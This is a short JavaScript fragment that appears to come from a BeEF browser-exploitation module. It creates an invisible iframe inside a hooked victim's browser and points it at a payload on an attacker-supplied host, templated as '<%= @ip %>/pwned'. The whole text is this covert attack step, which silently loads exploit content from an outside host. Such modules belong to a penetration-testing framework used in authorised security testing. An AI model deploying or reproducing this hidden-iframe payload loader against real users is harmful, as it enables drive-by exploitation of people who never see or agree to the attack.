// all we do in command.js is create an invisible iframe that points to the payload
var sploit = beef.dom.createInvisibleIframe();
sploit.src = 'http://<%= @ip %>/pwned';
